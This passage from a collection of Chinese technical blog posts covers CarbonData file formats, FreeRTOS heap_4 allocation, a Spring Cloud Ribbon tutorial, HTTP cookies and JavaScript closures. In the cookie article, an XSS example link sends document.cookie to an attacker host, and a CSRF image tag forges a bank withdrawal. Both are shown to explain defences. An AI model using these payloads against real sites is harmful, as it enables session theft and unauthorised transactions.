.dict文件\n字典的值每满1000就作为一个chunk输出一次，具体的类是ColumnDictionaryChunk\n相关参数：\ncarbon.dictionary.chunk.size\n1.2 .sortindex文件\n把字段的值sort了一下之后，计算出每个值的sortIndex和invertedIndex，具体的类是ColumnSortInfo\n1、List<SortIndex>，记录着每个字典值的surrogate，从1开始\n2、List<SortInvertedIndex>，记录着每个字典surrogate在数组中的位置，从1开始\n它们的关系如下：\n\n      sortIndex[i] = dictionarySortModel.getKey();\n      // the array index starts from 0 therefore -1 is done to avoid wastage\n      // of 0th index in array and surrogate key starts from 1 there 1 is added to i\n      // which is a counter starting from 0\n      sortIndexInverted[dictionarySortModel.getKey() - 1] = i + 1;\n\n假设字典值是beijing，shenzhen，shanghai\n\n\n\n城市\nsurrogate\nsortIndex\ninvertIndex\n\n\nbeijing\n1\n1\n1\n\n\nshenzhen\n2\n3\n3\n\n\nshanghai\n3\n2\n2\n\n\n\n \n \n \n1.3 .dictmeta文件\n该文件主要记录字典的以下属性，具体的类是ColumnDictionaryChunkMeta\n1、最小key\n2、最大的key\n3、开始offset\n4、结束offset\n5、chunk的数量\n2、数据文件详解\n2.1 数据块的组成部分\nCarbonRow在sort阶段会被分成3个部分:\n1、字典列\n2、非字典维度列和高基数列\n3、度量值列\n在写入的时候，先写入到TablePage里，TablePage会把数据拆分成4部分\n\n// one vector to make it efficient for sorting\nprivate ColumnPage[] dictDimensionPages;\nprivate ColumnPage[] noDictDimensionPages;\nprivate ComplexColumnPage[] complexDimensionPages;\nprivate ColumnPage[] measurePages;\n\n 每个TablePage都会记录以下几个Key：\n\nprivate byte[][] currentNoDictionaryKey;\n// MDK start key\nprivate byte[] startKey;\n// MDK end key\nprivate byte[] endKey;\n// startkey for no dictionary columns\nprivate byte[][] noDictStartKey;\n// endkey for no diciotn\nprivate byte[][] noDictEndKey;\n// startkey for no dictionary columns after packing into one column\nprivate byte[] packedNoDictStartKey;\n// endkey for no dictionary columns after packing into one column\nprivate byte[] packedNoDictEndKey;\n\n数据在一行一行写到TablePage之后，最后会做一次统一的编码，详细的方法请看TablePage的encode方法。\nPage的meta信息\n\n  private DataChunk2 buildPageMetadata(ColumnPage inputPage, byte[] encodedBytes)\n      throws IOException {\n    DataChunk2 dataChunk = new DataChunk2();\n    dataChunk.setData_page_length(encodedBytes.length);\n    fillBasicFields(inputPage, dataChunk);\n    fillNullBitSet(inputPage, dataChunk);\n    fillEncoding(inputPage, dataChunk);\n    fillMinMaxIndex(inputPage, dataChunk);\n    fillLegacyFields(dataChunk);\n    return dataChunk;\n  }\n\n一个blocket的阈值是64MB，一个blocket包括N个TablePage，当写满一个TablePage之后，就把blocket写入到文件当中。\ncarbondata的BTree索引，是一个记录着每个Blocklet的mdk的startKey和endKey，以及Blocklet当中所有TablePage的列的最大最小值\n那么数据文件的详细格式，基本和官网上介绍的是一致的\n\n2.2 What is MDK\nmdk和hbase的rowkey是一个性质的，详细可以看下面这张图，排序方式跟hbase没有任何区别。但是carbondata的mdk只能是字典列，如果我没有建立字典列的话，只是设置了SORT_COLUMN，Carbondata的过滤只是靠列的最大最小值\n\n \n3、索引文件详解\n索引文件以.carbonindex结尾\n索引文件包括三个部分：索引头，索引两部分\n索引头包括：\n1、文件格式版本(当前版本是V3)\n2、Segment信息（有多少列，列的基数）\n3、列的信息\n4、bucket ID\n \n索引信息包括以下信息：\n1、Blocket的记录数\n2、数据文件名\n3、Blocket的meta信息offset\n3、BlockletIndex (BTree索引，包含blocket的startKey、endKey，以及每一列的最大最小值，这个前面已经讲过了)\n4、BlocketInfo（记录数，每个TablePage的offset，每个TablePage的长度，维度列dimension_offsets的起始位置，度量值measure_offsets的起始位置，有多少个TablePagenumber_number_of_pages）\n \n索引文件的信息在文件的footer当中也是存在的，在carbondata1.2当中索引文件还是有很多个，感觉有点多余。\n到carbondata1.3会被合并成一个文件，这样就能大大缩短启动的时候加载索引的开销。\n \n \n岑玉海\n转载请注明出处，谢谢！\n \n \n"},{"title":"FreeRTOS--堆内存管理","body":"因为项目需要，最近开始学习FreeRTOS，一开始有些紧张，因为两个星期之前对于FreeRTOS的熟悉度几乎为零，经过对FreeRTOS官网的例子程序的摸索，和项目中问题的解决，遇到了很多熟悉的身影，以前在Linux平台编程的经历给了我一些十分有用的经验，后悔当初没能在第一家公司待下去，浪费了大好时光。好吧，现在还是潜下心来搞搞FreeRTOS吧。\n后续都是一系列FreeRTOS相关的随笔，先把FreeRTOS“圣经”--Mastering the FreeRTOS Real Time kernel -- A Hands On Tutorial Guide 20161204好好研读，接连的几个随笔都是我从这本“圣经”中翻译出来的。翻译难免有所疏漏、词不达意，大家凑合着看吧。\n从FreeRTOS V9.0.0开始FreeRTOS应用程序可以完全用静态分配内存，而没有必要引入堆内存管理。\n章节引言和范围\n前提\nFreeRTOS是以C源文件的形式提供的，因此成为一名合格的C语言编程人员是使用FreeRTOS的必要条件，因而这个章节假定读者熟悉以下概念：\n\nC语言项目是如何构建的，包含不同的编译和链接过程\n堆和栈分别是什么\n标准C库的malloc()和free()函数\n\n动态内存分配以及它和FreeRTOS的关系\n从FreeRTOS V9.0.0开始内核对象既可以在编译的时候静态分配，也可以在运行时动态分配。本书随后的章节将会介绍以下内核对象：tasks, queues, semaphores 和 event groups。为了尽可能让FreeRTOS易于使用，这些内核对象并不是在编译时静态分配的，而是在运行时动态分配的。内核对象创建时FreeRTOS分配RAM而在内核对象删除时释放内存。这样的策略减少了设计和计划上的努力，简化了API，并且减少了RAM的占用。\n动态内存分配是C语言编程的概念，而不是针对FreeRTOS或者多任务编程的概念。它和FreeRTOS是相关的，因为内核对象是动态分配的，并且通用编译器提供的动态内存分配方案对于实时应用程序并不总是适合的。\n内存可以使用标准C库的malloc()和free()函数来分配，但有可能不适合，或者恰当，因为下几点原因：\n\n在小型嵌入式系统中并不总是可用的\n它们的实现可能非常的大，占据了相当大的一块代码空间\n他们几乎都不是线程安全的\n它们并不是确定的，每次调用这些函数执行的时间可能都不一样\n它们有可能产生碎片\n它们有可能打乱链接器的配置\n如果允许堆空间的生长方向覆盖其他变量占据的内存，它们会成为debug的灾难\n\n动态内存分配的可选项\n从FreeRTOS V9.0.0开始内核对象既可以在编译时静态分配也可以在运行时动态分配。如今FreeRTOS把内存分配放在可移植层。这是认识到不同的嵌入式操作有不同的动态内存管理方法和时间要求，因此单个的动态内存分配算法将只适合于应用程序的一个子集。同样，从核心代码库中移除动态内存分配使得应用程序编写者提供自己的特定的实现，如果适合的话。\n当FreeRTOS需要RAM的时候，并不是调用malloc()，而是调用pvPortMalloc()。当需要释放RAM的时候，并不是调用free()，而是调用vPortFree()。pvPortMalloc()和标准C库的malloc()有同样的函数原型，vPortFree()和标准C库的free()有同样的函数原型。\npvPortMalloc() 和 vPortFree()都是公共函数，因此能够被应用代码调用。\nFreeRTOS对于pvPortMalloc()和vPortFree()提供了5种实现，后续章节会讲到。FreeRTOS应用程序可以使用其中的一种，或者使用自己的实现。5种实现分别在heap_1.c, heap_2.c, heap_3.c, heap_4.c 和 heap_5.c文件中，都存在于文件夹 FreeRTOS/Source/portable/MemMang 下。\n范围\n本章节致力于让读者深入理解：\n\nFreeRTOS何时分配RAM\nFreeRTOS 提供的5种内存分配方案\n选用哪一种内存分配方案\n\n内存分配方案示例\nHeap_4 （其他几种暂不去了解）\n和heap_1, heap_2 一样，heap_4也是把数组切割成更小的块。和前面一样，数组是静态声明的，由宏configTOTAL_HEAP_SIZE指定大小，所以这就使得即便数组中的内存还没有被分配出去就让应用程序显得消耗了大量的RAM。\nHeap_4使用了最先适应算法来分配内存。和heap_2不同，heap_4把临近的空闲的存储空间拼凑成一个更大的内存块，这就减少了内存碎片化的风险。\n最先适应算法确保了pvPortMalloc()使用第一块空闲的足够大的内存来满足要申请的字节数。考虑下面的情景：\n\n堆里有3块空闲内存块，它们的大小分别是5个字节，200个字节，100个字节\n调用pvPortMalloc()来申请20个字节的RAM\n满足字节数要求的第一块空闲RAM块是200个字节的RAM块，因此pvPortMalloc()把大小为200个字节的RAM块分割成两块，一块是20个字节，一块是180个字节，然会返回一个指向20个字节的指针。新的180个字节大小的RAM块将在后续的pvPortMalloc()调用中可用。\n\nFigure 7 演示了 heap_4 最先适应算法如何拼接内存，同样也演示了内存的分配和释放：\n\n\nA演示了创建3个任务之后的数组的样子，一大块空的块存在于数组的顶端。\nB演示了删除1个任务之后的数组，一大块空的块存在于数组的顶端。被删除的那个任务占据的TCB和栈存储空间现在是空的，并且它们拼接成一个大的空的块。\nC演示了FreeRTOS创建了一个Queue。队列是通过xQueueCreate() API 创建的，它是调用pvPortMalloc() 来分配存储空间的。由于heap_4采用最先适应算法，pvportMalloc()将会使用第一块大的足够容纳队列的RAM块来分配，在Figure 7中就采用之前删除任务的那一块。然而队列并不完全消耗那个空闲的区块，所以那个RAM块会分成两个部分，未使用的部分将会由后续的pvPortMalloc()占用。\nD演示了应用程序直接调用pvPortMalloc()而不是间接地由FreeRTOS API调用之后的情形。用户分配的区块足够小，能够放在第一个空闲的区块中，这个区块就是队列占用的区块和后面的TCB占用的区块之间的那一块。\n删除任务释放的内存，现在被分割成3个区块，第一个区块是队列，第二个区块是用户分配的，第三个区块还是空的。\nE 演示了队列删除之后，存储空间也自动释放了。现在用户分配的区块两边都是空闲区块。\nF 演示了用户分配的存储空间释放的情形。这个区块现在和两边的空闲区块拼接成了一个更大的空闲区块。\n\nHeap_4并不是确定性的，但是要比标准库函数实现的malloc()和free()运行的更快。\n设定Heap_4数组的起始地址\n此章节包含更高阶的信息，仅仅为了使用Heap_4是没有必要阅读和理解此章节的。\n某些时候应用程序开发者需要指定heap_4数组的起始地址位于某个特定的内存。例如，FreeRTOS 任务的栈是从堆中分配的，就有可能有必要保证堆是分配在快速的内存中，而不是慢速的外存。\n默认情况下，heap_4数组是在heap_4.c源文件中声明的，它的起始地址是由链接器自动确定的。然而，如果在文件FreeRTOSConfig.h中把编译时配置选项configAPPLICATION_ALLOCATED_HEAP设为常量1，那么数组必须由使用FreeRTOS的应用声明。如果把数组声明为应用的一部分，那么应用编写者可以指定数组的起始地址。\n如果把文件FreeRTOSConfig.h中的configAPPLICATION_ALLOCATED_HEAP设定为1，那么应用程序源文件中必须声明一个名字为ucHeap的uint8_t类型的数组，它的大小有configTOTAL_HEAP_SIZE设定。\n把变量放在某个内存地址的语法取决于使用了哪种编译器，下面演示了两种编译器的用法：\n\nListing 2演示的是GCC编译器声明数组并把数组放在名字为.my_heap的段中。\nListing 3演示的是IAR编译器把数组放在内存绝对地址0x20000000上。\n\n\nuint8_t ucHeap [configTOTAL_HEAP_SIZE] attribute (( section(\".my_heap\") ));\n\nListing 2\n\nuint8_t ucHeap [configTOTAL_HEAP_SIZE] @ 0x20000000;\n\nListing 3\n和堆相关的实用函数\nxPortGetFreeHeapSize() API\n这个函数可以获取调用时堆中空闲内存的大小，以字节为单位。使用它可以优化堆的大小。例如，当内核对象都创建完毕后调用xPortGetFreeHeapSize()返回2000，那么可以把configTOTAL_HEAP_SIZE减小2000.\n需要注意，当使用heap_3时是不能调用这个函数的。\nxPortGetMinimumEverFreeHeapSize() API\n此函数返回FreeRTOS应用程序开始运行之后曾经存在的最小的未被分配的存储空间的字节数。它的返回值指示了应用程序离将要耗尽堆空间的接近程度。例如xPortGetMinimunEverFreeHeapSize()返回200个字节，那么从应用程序开始运行之后的某个时间，在使用200个字节就会把堆空间用完。\n需要注意，xPortGetMinimumEverFreeHeapSize()只在使用heap_4或者heap_5时生效。\nMalloc 失败钩子函数\n应用程序可以直接调用pvPortMalloc()。当然在FreeRTOS源文件中每当内核对象创建时也会调用这个函数。此类的内核对象包括任务，队列，信号量和事件组。\n和标准库函数malloc()一样，如果pvPortMalloc()因为申请RAM的大小不能满足没能返回一块RAM空间就会返回NULL。如果编程人员调用pvPortMalloc()来创建内核对象，但是返回NULL就说明内核对象没有创建成功。\n例子中的所有堆分配方案都可以给pvPortMalloc()配置一个钩子函数（也称作回调函数），当pvPortMalloc()返回NULL时调用这个钩子函数。\n如果文件FreeRTOSConfig.h中的configUSE_MALLOC_FAILED_HOOK设置为1，那么应用程序必须提供一个内存分配失败时的钩子函数，它的名字和原型参见如下。只要对这个应用来说是合适的，这个钩子函数可以用任何方法来实现。\n\nvoid vApplicationMallocFailedHook( void );\n\n声明\n欢迎转载，请注明出处和作者，同时保留声明。\n作者：LinTeX9527\n出处：http://www.cnblogs.com/LinTeX9527/p/8007541.html\n本博客的文章如无特殊说明，均为原创，转载请注明出处。如未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接，否则保留追究法律责任的权利。\n"},{"title":"【微服务】之四：轻松搞定SpringCloud微服务-负载均衡Ribbon","body":"\n对于任何一个高可用高负载的系统来说，负载均衡是一个必不可少的名称。在大型分布式计算体系中，某个服务在单例的情况下，很难应对各种突发情况。因此，负载均衡是为了让系统在性能出现瓶颈或者其中一些出现状态下可以进行分发业务量的解决方案。在SpringCloud 体系当中，加入了Netflix公司的很多优秀产品，其中一个就是针对于服务端进行负载均衡的Ribbon。\n\n本系列博文目录\n【微服务】之三：轻松搞定SpringCloud微服务目录\n本系列为连载文章，阅读本文之前强烈建议您先阅读前面几篇。\n相关简介\n负载均衡简介\n负载均衡：英文名称为Load Balance， 建立在现有网络结构之上，它提供了一种廉价有效透明的方法扩展网络设备和服务器的带宽、增加吞吐量、加强网络数据处理能力、提高网络的灵活性和可用性。其意思就是分摊到多个操作单元上进行执行，例如Web服务器、FTP服务器、企业关键应用服务器和其它关键任务服务器等，从而共同完成工作任务。\n负载均衡带来的好处很明显：\nRibbon简介\nRibbon是Netflix开源的一款用于客户端软负载均衡的工具软件。Spring Cloud对Ribbon进行了一些封装以更好的使用Spring Boot的自动化配置理念。\nSpring Cloud Ribbon 简介\nSpring Cloud Ribbon是基于Netflix Ribbon实现的一套客户端负载均衡的工具。它是一个基于HTTP和TCP的客户端负载均衡器。它可以通过在客户端中配置ribbonServerList来设置服务端列表去轮询访问以达到均衡负载的作用。\n开始起飞\n起飞之前，先说明一下，本项目前几篇文章中已经构建了相关子项目包括：注册中心、配置中心。本文中继续可以使用。\n创建两个服务器\n需要创建两个一模一样的服务器，让客户端按照不同的机制进行分发，达到负载均衡的效果。我们约定两个子项目名称：\ncloud-hyh-service-1 端口号：8071\ncloud-hyh-service-2 端口号：8072\n对于服务名称设置一样：cloud-service ，其他业务都一样，可以复制。【端口号不一样】\npom.xml文件配置\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.cloud</groupId>\n        <artifactId>spring-cloud-starter-eureka</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-web</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-test</artifactId>\n        <scope>test</scope>\n    </dependency>\n</dependencies>\n<build>\n    <plugins>\n        <plugin>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-maven-plugin</artifactId>\n        </plugin>\n    </plugins>\n</build>\n服务器一参数配置\n#服务注册中心配置\neureka:\n  client:\n    service-url:\n      defaultZone: http://localhost:8081/eureka/\n  instance:\n    appname: cloud-service\n    lease-renewal-interval-in-seconds: 1\n\nserver:\n  port: 8071\n\nspring:\n  application:\n    name: cloud-service\n\n服务器二参数配置\n#服务注册中心配置\neureka:\n  client:\n    service-url:\n      defaultZone: http://localhost:8081/eureka/\n  instance:\n    appname: cloud-service\n\nserver:\n  port: 8072\n\nspring:\n  application:\n    name: cloud-service\n说明：与配置一其实基本一样，只不过将端口号配置成 8072\n服务器入口配置Application.yml\n/**\n * @Description : \n * @Author hanyahong\n * @Date 2017/12/7- 17:35\n */\n@SpringBootApplication\n@EnableDiscoveryClient\npublic class ServiceTwoApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(ServiceTwoApplication.class, args);\n    }\n}\n新建测试API类\n/**\n * @Description :测试RibbonTest API\n * @Author hanyahong\n * @Date 2017/12/7- 17:40\n */\n@RestController\n@RequestMapping(value = \"/ribbon\")\npublic class RibbonTestApi {\n\n    /**\n     * 获取博客名称API\n     *\n     * @return 相关信息\n     */\n    @RequestMapping(value = \"name\", method = RequestMethod.GET)\n    public String getMyBlogNameApi() {\n        return \"千万之路刚开始-www.hanyahong.com-beijing\"+\"该服务器端口号：8071\";\n    }\n}\n\n\n备注：两台服务器，除了返回的服务器端口号 8071 8072不同之外，其他都相同，就是为了看到效果。\n创建测试客户端\n创建一个子项目，cloud-hyh-ribbon-client ,主要用来测试ribbon客户端负载。\npom文件配置\n在pom文件中加入以下依赖：\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.cloud</groupId>\n        <artifactId>spring-cloud-starter-eureka</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-web</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-test</artifactId>\n        <scope>test</scope>\n    </dependency>\n</dependencies>\n<build>\n     <plugins>\n         <plugin>\n             <groupId>org.springframework.boot</groupId>\n             <artifactId>spring-boot-maven-plugin</artifactId>\n         </plugin>\n     </plugins>\n </build>\n配置文件application配置\neureka:\n  client:\n    service-url:\n      defaultZone: http://localhost:8081/eureka/\n  instance:\n    appname: ribbon-client\n\nserver:\n  port: 8092\n\nspring:\n  application:\n    name: ribbon-client\n配置子项目启动类\n/**\n * @Description :启动类，示范负载均衡服务器\n * @Author hanyahong\n * @Date 2017/12/7- 17:00\n */\n@SpringBootApplication\n@EnableDiscoveryClient\npublic class RibbonServiceApplication {\n\n    public static void main(String[] args) {\n\n        SpringApplication.run(RibbonServiceApplication.class, args);\n    }\n\n    /**\n     * Spring提供的用于访问Rest服务的客户端\n     * @return\n     */\n    @Bean\n    @LoadBalanced\n    RestTemplate restTemplate() {\n        return new RestTemplate();\n    }\n}\n说明：\n\nRestTemplate是Spring提供的用于访问Rest服务的客户端。RestTemplate提供了多种便捷访问远程Http服务的方法，能够大大提高客户端的编写效率。调用RestTemplate的默认构造函数，RestTemplate对象在底层通过使用java.net包下的实现创建HTTP 请求，可以通过使用ClientHttpRequestFactory指定不同的HTTP请求方式。\nClientHttpRequestFactory接口主要提供了两种实现方式，一种是SimpleClientHttpRequestFactory，使用J2SE提供的方式（既java.net包提供的方式）创建底层的Http请求连接，还有一种方式是使用HttpComponentsClientHttpRequestFactory方式，底层使用HttpClient访问远程的Http服务，使用HttpClient可以配置连接池和证书等信息。\n\n**@LoadBalanced** 注解加在RestTemplate上面，这个注解会自动构造LoadBalancerClient接口的实现类并注册到Spring容器中。\n创建接口API\n/**\n * @Description : 测试客户端负载均衡的接口API\n * @Author hanyahong\n * @Date 2017/12/7- 18:01\n */\n@RestController\n@RequestMapping(value = \"/test\")\npublic class TestRibbonApi {\n    /**\n     * 注入RestTemplate\n     */\n    @Autowired\n    RestTemplate restTemplate;\n\n\n    @RequestMapping(value = \"/blog/name\" ,method = RequestMethod.GET)\n    public String testGetNameOfBlog(){\n        String url=\"http://CLOUD-SERVICE/ribbon/name\";\n        return restTemplate.getForObject(url,String.class);\n    }\n}\n注意：这个代码中 url 设置的是 上面提到的服务器的服务名。\n启动项目群进行测试\n经过全面的配置，服务器全面配置完毕，包括一个注册中心、一个配置中心、两个相同配置的服务器、一台测试客户端负载均衡的测试服务器。\n启动成功以后会在注册中心看到。\n\n通过访问客户端地址：http://localhost:8092/test/name 就可以访问。效果如下：\n\n刷新一次：\n\n至此所有配置成功。测试结果也成功。\n本文源码\nGithub源码：https://github.com/hanyahong/spring-cloud-microservice\n"},{"title":"这一次带你彻底了解Cookie","body":"前言\n网络早期最大的问题之一是如何管理状态。简而言之，服务器无法知道两个请求是否来自同一个浏览器。当时最简单的方法是在请求时，在页面中插入一些参数，并在下一个请求中传回参数。这需要使用包含参数的隐藏的表单，或者作为URL参数的一部分传递。这两个解决方案都手动操作，容易出错。\n网景公司当时一名员工Lou Montulli，在1994年将“cookies”的概念应用于网络通信，用来解决用户网上购物的购物车历史记录，目前所有浏览器都支持cookies。\ncookie是什么\ncookie翻译过来是“饼干，甜品”的意思，cookie在网络应用中到处存在，当我们浏览之前访问过的网站，网页中可能会显示：你好，王三少，这就会让我们感觉很亲切，像吃了一块很甜的饼干一样。\n由于http是无状态的协议，一旦客户端和服务器的数据交换完毕，就会断开连接，再次请求，会重新连接，这就说明服务器单从网络连接上是没有办法知道用户身份的。怎么办呢？那就给每次新的用户请求时，给它颁发一个身份证（独一无二）吧，下次访问，必须带上身份证，这样服务器就会知道是谁来访问了，针对不同用户，做出不同的响应。，这就是Cookie的原理。\n其实cookie是一个很小的文本文件，是浏览器储存在用户的机器上的。Cookie是纯文本，没有可执行代码。储存一些服务器需要的信息，每次请求站点，会发送相应的cookie，这些cookie可以用来辨别用户身份信息等作用。\n\n如图所示,用户首次访问服务器，服务器会返回一个独一无二的识别码；id=23451，这样服务器可以用这个码跟踪记录用户的信息，（购物历史，地址信息等）。\ncookie可以包含任意的信息，不仅仅是id，客户端会记录服务器返回来的Set-Cookie首部中的cookie内容。并将cookie存储在浏览器的cookie数据库中，当用户访问同一站点时，浏览器就会挑选当时该站点颁发的id=XXX的身份证（cookie），并在Cookie请求首部发送过去。\ncookie的类型\n可以按照过期时间分为两类：会话cookie和持久cookie。会话cookie是一种临时cookie，用户退出浏览器，会话Cookie就会被删除了，持久cookie则会储存在硬盘里，保留时间更长，关闭浏览器，重启电脑，它依然存在，通常是持久性的cookie会维护某一个用户周期性访问服务器的配置文件或者登录信息。\n\n持久cookie 设置一个特定的过期时间（Expires）或者有效期（Max-Age）\n\n\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2019 07:28:00 GMT;\n\ncookie的属性\ncookie的域\n产生Cookie的服务器可以向set-Cookie响应首部添加一个Domain属性来控制哪些站点可以看到那个cookie，例如下面：\n\nSet-Cookie: name=\"wang\"; domain=\"m.zhuanzhuan.58.com\"\n\n如果用户访问的是m.zhuanzhuan.58.com那就会发送cookie: name=\"wang\", 如果用户访问www.aaa.com（非zhuanzhuan.58.com）就不会发送这个Cookie。\ncookie的路径 Path\nPath属性可以为服务器特定文档指定Cookie，这个属性设置的url且带有这个前缀的url路径都是有效的。\n例如：m.zhuanzhuan.58.com 和 m.zhaunzhuan.58.com/user/这两个url。 m.zhuanzhuan.58.com 设置cookie\n\nSet-cookie: id=\"123432\";domain=\"m.zhuanzhuan.58.com\";\n\nm.zhaunzhuan.58.com/user/ 设置cookie：\n\nSet-cookie：user=\"wang\", domain=\"m.zhuanzhuan.58.com\"; path=/user/\n\n但是访问其他路径m.zhuanzhuan.58.com/other/就会获得\n\ncookie: id=\"123432\"\n\n如果访问m.zhuanzhuan.58.com/user/就会获得\n\n  cookie: id=\"123432\"\n  cookie: user=\"wang\"\n\n \nsecure\n设置了属性secure，cookie只有在https协议加密情况下才会发送给服务端。但是这并不是最安全的，由于其固有的不安全性，敏感信息也是不应该通过cookie传输的.\n\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure;\n\n\nchrome 52和firefox 52 开始不安全的（HTTP）是无法使用secure的：\n\n操作Cookie\n通过docuemnt.cookie可以设置和获取Cookie的值\n\ndocument.cookie = \"user=wang\";\nconsole.log(document.cookie);\n\n\n禁止javascript操作cookie（为避免跨域脚本(xss)攻击，通过javascript的document.cookie无法访问带有HttpOnly标记的cookie。）\n\n\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2017 07:28:00 GMT; Secure; HttpOnly\n\n第三方cookie\n通常cookie的域和浏览器地址的域匹配，这被称为第一方cookie。那么第三方cookie就是cookie的域和地址栏中的域不匹配，这种cookie通常被用在第三方广告网站。为了跟踪用户的浏览记录，并且根据收集的用户的浏览习惯，给用户推送相关的广告。\n\n如上图（a）：用户访问服务器1的一个页面index.html，这个页面和第三方广告网站合作，这个页面还有一张www.advertisement.com域名下的一张广告图ad1.jpg，当请求这张ad1.jpg图片的时候，www.advertisement.com这个服务器会给用户设置cookie\n\nSet-Cookie: user=\"wang\";like=\"a\"; domain=\"advertisement.com\"\n\n记录用户的浏览记录，分配一个user来表示用户的身份。\n图（b）：用户访问服务器2的一个index.html页面，这个页面也和同一家广告商合作，这个页面也包含一张www.advertisement.com域名下的一张广告图ad2.jpg，当请求这张ad2.jpg图片的时候，浏览器就会向www.advertisement.com发送cookie\n\nCookie:  user=\"wang\"; like=\"a\";\n\nwww.advertisement.com收到浏览器发送的cookie识别了用户的身份，同时又把这个页面用户的浏览数据设置cookie\n\nSet-Cookie: buy=\"b\"; domain=\"advertisement.com\"\n\n图（c）：很巧，用户访问服务器3的一个index.html页面，这个页面也和那一家广告商合作，这个页面也包含一张www.advertisement.com域名下的一张广告图ad3.jpg，当请求这张ad3.jpg图片的时候，浏览器就会向www.advertisement.com发送cookie\n\nCookie:  user=\"wang\"; like=\"a\"; buy=\"b\"\n\n这样广告公司就可以根据用户的浏览习惯，给用户推送合适的广告。\n安全\n多数网站使用cookie作为用户会话的唯一标识，因为其他的方法具有限制和漏洞。如果一个网站使用cookies作为会话标识符，攻击者可以通过窃取一套用户的cookies来冒充用户的请求。从服务器的角度，它是没法分辨用户和攻击者的，因为用户和攻击者拥有相同的身份验证。 下面介绍几种cookie盗用和会话劫持的例子：\n网络窃听\n网络上的流量可以被网络上任何计算机拦截，特别是未加密的开放式WIFI。这种流量包含在普通的未加密的HTTP清求上发送Cookie。在未加密的情况下，攻击者可以读取网络上的其他用户的信息，包含HTTP Cookie的全部内容，以便进行中间的攻击。比如：拦截cookie来冒充用户身份执行恶意任务（银行转账等）。\n解决办法：服务器可以设置secure属性的cookie，这样就只能通过https的方式来发送cookies了。\nDNS缓存中毒\n如果攻击者可以使DNS缓存中毒，那么攻击者就可以访问用户的Cookie了，例如：攻击者使用DNS中毒来创建一个虚拟的NDS服务h123456.www.demo.com指向攻击者服务器的ip地址。然后攻击者可以从服务器 h123456.www.demo.com/img_01.png 发布图片。用户访问这个图片，由于 www.demo.com和h123456.www.demo.com是同一个子域，所以浏览器会把用户的与www.demo.com相关的cookie都会发送到h123456.www.demo.com这个服务器上，这样攻击者就会拿到用户的cookie搞事情。\n一般情况下是不会发生这种情况，通常是网络供应商错误。\n跨站点脚本XSS\n使用跨站点脚本技术可以窃取cookie。当网站允许使用javascript操作cookie的时候，就会发生攻击者发布恶意代码攻击用户的会话，同时可以拿到用户的cookie信息。\n例子：\n\n<a href=\"#\" onclick=`window.location=http://abc.com?cookie=${docuemnt.cookie}`>领取红包</a>\n\n当用户点击这个链接的时候，浏览器就会执行onclick里面的代码，结果这个网站用户的cookie信息就会被发送到abc.com攻击者的服务器。攻击者同样可以拿cookie搞事情。\n解决办法：可以通过cookie的HttpOnly属性，设置了HttpOnly属性，javascript代码将不能操作cookie。\n跨站请求伪造CSRF\n例如，SanShao可能正在浏览其他用户XiaoMing发布消息的聊天论坛。假设XiaoMing制作了一个引用ShanShao银行网站的HTML图像元素，例如，\n\n<img  src = \"http://www.bank.com/withdraw?user=SanShao&amount=999999&for=XiaoMing\" >\n\n如果SanShao的银行将其认证信息保存在cookie中，并且cookie尚未过期，(当然是没有其他验证身份的东西)，那么SanShao的浏览器尝试加载该图片将使用他的cookie提交提款表单，从而在未经SanShao批准的情况下授权交易。\n解决办法：增加其他信息的校验（手机验证码，或者其他盾牌）。\n 如果你喜欢我们的文章，关注我们的公众号和我们互动吧。\n "},{"title":"JavaScript--我发现，原来你是这样的JS：函数表达式和闭包","body":"一、介绍\n\n本次博客主要介绍函数表达式的内容，主要是闭包。\n\n二、函数表达式\n\n定义函数的两种方式：一个是函数声明，另一个就是函数表达式。\n\n\n//1.函数声明写法\nfunction fn2(){\n    console.log('函数声明');  \n}\n//2.函数表达式写法\nvar fn1 = function(){\n    console.log('函数表达式');\n}\n区别：\n1.函数声明是用function后面有函数名，函数表达式是赋值形式给一个变量。\n2.函数声明可以提升函数，而函数表达式不会提升\n函数提升就是函数会被自动提升到最前方，以至于再调用函数后再声明函数也不会有错：\n//例子：\n//先调用运行\nsayName();\n//再声明函数\nfunction sayName(){\n    console.log('ry');\n}\n\n//运行结果\n'ry'\n函数表达式就不会被提升：\n//先调用\nsayBye();\n//函数表达式\nvar sayBye = function(){\n    console.log('bye bye');\n}\n\n//运行报错\n但是下面的写法很危险：因为存在函数声明的提升\n//书上代码\nif(condition){\n    function sayHi(){\n        console.log('hi');\n    }\n}\nelse{\n    function sayHi(){\n        console.log('yo');\n    }\n}\n解说一下： 这段代码想表达在condition为true时声明sayHi，不然就另一函数sayHi，但是运行结果往往出乎意料，在当前chrome或firefox可能能做到，但是在IE10以下的浏览器（我测试过）往往不会遵循你的意愿，不管condition是true还是false都会输出yo。\n这时函数表达式能派上用场了：\n//换成函数表达式，没问题因为不会被提升，只有当执行时才赋值\nvar sayHi = null;\nif(condition){\n    sayHi = function (){\n        console.log('hi');\n    }\n}\nelse{\n    sayHi = function sayHi(){\n        console.log('yo');\n    }\n}\n三、闭包\n\n闭包的定义：有权访问另一个函数作用域中的变量的函数\n\n有人觉得闭包很难理解，一开始我也是这样的，我认为那是对一些概念还不够了解。\n定义中说明了什么是闭包，最常见的形式就是在函数中再声明一个函数。\n重点理解这里：\n1.闭包能访问外围函数的变量是因为其作用域链中有外围函数的活动对象（这个活动对象即使在外围函数执行完还会存在，不会被销毁，因为被闭包引用着）。\n2.闭包是函数中的函数，也就是说其被调用时也创建执行上下文，对于执行上下文这部分可以看看这篇：深入理解js执行--创建执行上下文这篇博客。\n理解了上面之后我们再来看闭包的例子：\nfunction a(){\n    //a函数的变量\n    var val_a = \"我是a函数里的变量\";\n    